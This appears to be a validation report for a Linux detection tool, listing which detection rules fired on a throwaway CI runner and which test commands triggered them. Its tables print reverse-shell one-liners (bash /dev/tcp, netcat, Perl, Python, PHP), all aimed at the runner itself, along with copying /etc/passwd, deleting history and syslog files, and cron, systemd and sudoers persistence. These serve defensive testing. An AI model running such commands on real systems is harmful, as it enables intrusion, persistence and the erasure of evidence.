# Live validation: Linux

> **Validated on a GitHub runner, not on your server.** These results come from a throw-away
> `ubuntu-24.04` runner (release [ubuntu24/20261101.360](https://github.com/actions/runner-images/releases/tag/ubuntu24%2F20261101.360))
> with Sysmon for Linux and ZAAFVesper installed as `packaging/linux/README.md` describes. Your
> distribution, kernel and Sysmon configuration will differ.

**Run:** <https://github.com/rifqifitriady/ZAAFVesper/actions/runs/42576321836> (commit `d1dfe53`, workflow `.github/workflows/live-windows-linux.yml`).

## Setup on the runner

| Part | Version and pin |
|---|---|
| Sysmon for Linux | `sysmonforlinux` 1.6.0 and `sysinternalsebpf` 2.3.0 from `packages.microsoft.com` (ubuntu/24.04), each `.deb` SHA-256 pinned. It logs to journald as `sysmon.service`, and its journald rate limit is lifted with `packaging/linux/sysmon-log-ratelimit.conf`. |
| Sysmon configuration | `scripts/ci/b/sysmon-linux.xml`: every process create/exit, network connect, file create and delete |
| ZAAFVesper | built from this commit, installed under `/usr/local/{sbin,etc}` and started with `packaging/linux/zaafvesper.service` (hardened unit) |
| Tests | Atomic Red Team at commit `a0e3f9bc…` (hash-checked YAML), run as root by `scripts/ci/b/artrun` from `scripts/ci/b/linux-plan.json` |

How tests are counted: as for Windows (see [windows.md](windows.md)). "inline" tests are local equivalents of the converted Sigma rules, most of which have no Atomic test. Everything acts on the runner itself, on `127.0.0.1` or on the runner's own address.

16 rules for linux: **16 fired**, **0 fired for some tests only**, **0 did not fire**, **0 not tested**.

| Rule | Result | Tests | Detail |
|---|---|---|---|
| Copy Passwd Or Shadow From TMP Path<br>`rules/sigma/linux/proc_creation_lnx_cp_passwd_or_shadow_tmp.yml` | fired | inline-cp-passwd-tmp: fired | /usr/bin/cp (pid 5604, parent /home/runner/work/ZAAFVesper/ZAAFVesper/build/artrun) ran: cp /etc/passwd /tmp/zaafvesper-passwd (Sigma rule by Joseliyo Sanchez, @Joseliyo_Jstnk) |
| Cron job file created<br>`rules/linux/persistence_cron_file_write.yml` | fired | art-T1053.003-078e69eb: fired, art-T1053.003-2d943c18: fired | /usr/bin/dash (pid 5213, user ) created cron file /etc/cron.d/persistevil |
| History File Deletion<br>`rules/sigma/linux/proc_creation_lnx_susp_history_delete.yml` | fired | art-T1070.003-a934276e: fired | /usr/bin/rm (pid 5482, parent /usr/bin/dash) ran: rm /root/.bash_history (Sigma rule by Florian Roth (Nextron Systems)) |
| Interactive shell redirected to a network socket<br>`rules/linux/execution_reverse_shell_dev_tcp.yml` | fired | inline-bash-dev-tcp: fired | /usr/bin/bash (pid 5488, parent /home/runner/work/ZAAFVesper/ZAAFVesper/build/artrun, user root) reverse shell: /bin/bash -c IP=$(hostname -I \| awk '{print $1}'); (timeout 6 nc -l "$IP" 4444 >/dev/null 2>&1 &); sleep 1;… |
| Linux HackTool Execution<br>`rules/sigma/linux/proc_creation_lnx_susp_hktl_execution.yml` | fired | inline-hacktool-name: fired | /tmp/zaafvesper/nuclei (pid 5606, parent /home/runner/work/ZAAFVesper/ZAAFVesper/build/artrun) ran: /tmp/zaafvesper/nuclei (Sigma rule by Nasreddine Bencherchali (Nextron Systems), Georg Lauenstein (sure[secure])) |
| Linux Reverse Shell Indicator<br>`rules/sigma/linux/net_connection_lnx_back_connect_shell_dev.yml` | fired | inline-bash-dev-tcp: fired | /usr/bin/bash (pid 5498) outbound connection 10.1.0.191:41976 -> 10.1.0.191:4444 (Sigma rule by Florian Roth (Nextron Systems)) |
| Linux Webshell Indicators<br>`rules/sigma/linux/proc_creation_lnx_webshell_detection.yml` | fired | inline-webshell-parent: fired | /usr/bin/whoami (pid 5646, parent /tmp/zaafvesper/nginx) ran: /usr/bin/whoami (Sigma rule by Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)) |
| Potential Netcat Reverse Shell Execution<br>`rules/sigma/linux/proc_creation_lnx_netcat_reverse_shell.yml` | fired | inline-netcat-e: fired | /usr/bin/nc.openbsd (pid 5591, parent /usr/bin/timeout) ran: nc -e /bin/sh 127.0.0.1 4444 (Sigma rule by @d4ns4n_, Nasreddine Bencherchali (Nextron Systems)) |
| Potential PHP Reverse Shell<br>`rules/sigma/linux/proc_creation_lnx_php_reverse_shell.yml` | fired | inline-php-fsockopen: fired | /usr/bin/php8.3 (pid 5600, parent /usr/bin/timeout) ran: php -r $sock=fsockopen("127.0.0.1",4447);exec("/bin/sh -i <&3 >&3 2>&3"); (Sigma rule by @d4ns4n_) |
| Potential Perl Reverse Shell Execution<br>`rules/sigma/linux/proc_creation_lnx_perl_reverse_shell.yml` | fired | inline-perl-socket: fired | /usr/bin/perl (pid 5594, parent /usr/bin/timeout) ran: perl -e use Socket;$i="127.0.0.1";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STD… |
| Python Reverse Shell Execution Via PTY And Socket Modules<br>`rules/sigma/linux/proc_creation_lnx_python_reverse_shell.yml` | fired | inline-python-pty: fired | /usr/bin/python3.12 (pid 5597, parent /usr/bin/timeout) ran: python3 -c import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",4446));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh") (Sigma rule by @d… |
| Shell history file deleted<br>`rules/linux/stealth_shell_history_deleted.yml` | fired | art-T1070.003-a934276e: fired | /usr/bin/rm (pid 5482, user ) deleted /root/.bash_history |
| Sudoers file created outside visudo<br>`rules/linux/privilege_escalation_sudoers_file_write.yml` | fired | inline-sudoers-dropin: fired | /usr/bin/tee (pid 5486, user ) wrote /etc/sudoers.d/zaafvesper-validation |
| Suspicious Java Children Processes<br>`rules/sigma/linux/proc_creation_lnx_susp_java_children.yml` | fired | inline-java-child: fired | /usr/bin/dash (pid 5638, parent /usr/lib/jvm/temurin-17-jdk-amd64/bin/java) ran: /bin/sh -c id (Sigma rule by Nasreddine Bencherchali (Nextron Systems)) |
| Syslog Clearing or Removal Via System Utilities<br>`rules/sigma/linux/proc_creation_lnx_clear_syslog.yml` | fired | inline-syslog-rm: fired | /usr/bin/rm (pid 5602, parent /home/runner/work/ZAAFVesper/ZAAFVesper/build/artrun) ran: rm -f /var/log/syslog.zaafvesper-validation (Sigma rule by Max Altgelt (Nextron Systems), Roberto Rodriguez (Cyb3rWard0g), OTR (Ope… |
| Systemd unit file created outside the package manager<br>`rules/linux/persistence_systemd_unit_file_write.yml` | fired | art-T1543.002-d9e4f24f: fired | /usr/bin/bash (pid 5221, user ) created systemd unit /etc/systemd/system/art-systemd-service.service |

## Tests run

| Test | Kind | Exit | Note |
|---|---|---|---|
| art-T1053.003-078e69eb Cron - Add script to /etc/cron.d folder | atomic | 0 |  |
| art-T1053.003-2d943c18 Cron - Add script to /var/spool/cron/crontabs/ folder | atomic | 0 |  |
| art-T1543.002-d9e4f24f Create Systemd Service | atomic | 0 |  |
| art-T1070.003-a934276e Clear Bash history (rm) | atomic | 0 | The setup step creates the history file first so the delete happens. |
| inline-sudoers-dropin  | inline | 0 | A comment-only drop-in, removed right after. |
| inline-bash-dev-tcp  | inline | 0 | The listener is on the runner's own address; nothing leaves the machine. |
| inline-netcat-e  | inline | 0 | The runner's nc (OpenBSD) refuses -e; the command line is what the rule checks. |
| inline-perl-socket  | inline | 0 | Closed local port: the connection fails. |
| inline-python-pty  | inline | 0 | Closed local port: the connection fails. |
| inline-php-fsockopen  | inline | 0 | Closed local port. Needs php on the runner image. |
| inline-syslog-rm  | inline | 0 | Removes a file that does not exist; the command line is what the rule checks. |
| inline-cp-passwd-tmp  | inline | 0 |  |
| inline-hacktool-name  | inline | 0 | /bin/true copied under a scanner's name. |
| inline-java-child  | inline | 0 | Needs a JDK on the runner image (single-file source launch). The JVM stays up 3 s after its child, as a server would: Sysmon for Linux reports the forking thread as the parent, and the sensor maps it to the JVM through /… |
| inline-webshell-parent  | inline | 0 | bash copied under the name nginx starts whoami, as a web server running a webshell would. |

## What the live runs found and fixed

1. **The systemd unit could not start on Ubuntu.** `/var/log` is `root:syslog 0775` on Debian and Ubuntu, and ZAAFVesper refuses
   (rightly) an output folder whose parent another account can change. The unit now writes to
   `/var/lib/zaafvesper/logs` (systemd `StateDirectory`, root-only). Upgrade note in `packaging/linux/README.md`; test `TestLinuxUnitOutputDir`.
2. **Parents of multi-threaded processes were lost.** Sysmon for Linux reports the *thread* that forked as `ParentProcessId`, and
   leaves `ParentImage` empty when that is not a process. With a JVM or a Go program as parent, `ps.parent.*` was nil, so
   "Suspicious Java Children Processes" did not fire. The journald source now maps such a thread id to its process through
   `/proc/<tid>/status` (`Tgid`) while the thread exists, and records the original id in `evt.arg[parent_thread_id]`
   (`FixThreadParent`, tests `TestFixThreadParent` and `TestTgidOfOwnThreads`). This works only while the forking thread is alive.
   A parent that exits right after starting its child, as a short command-line Java program does, still loses it. The Java test
   therefore keeps its JVM up for 3 s, as a server would.
3. **Kill identity.** Sysmon for Linux events arrive through journald after a short delay, so most short-lived commands had exited
   before their identity could be bound (`identity_read_errors` in the service journal). The kill response refuses these by design;
   long-lived processes were bound. Kills themselves are validated by workstream D.
4. **Smaller observations.** Sysmon for Linux writes `-` for the user of many file events, so `ps.username` is empty there. It
   appends ` (deleted)` to the image path of a process whose executable was removed.

## Re-run

Actions → `live-windows-linux` → *Run workflow*, or push to a `validate/**` branch. The `validation-linux` artifact holds the alerts, the service journal and per-test results.
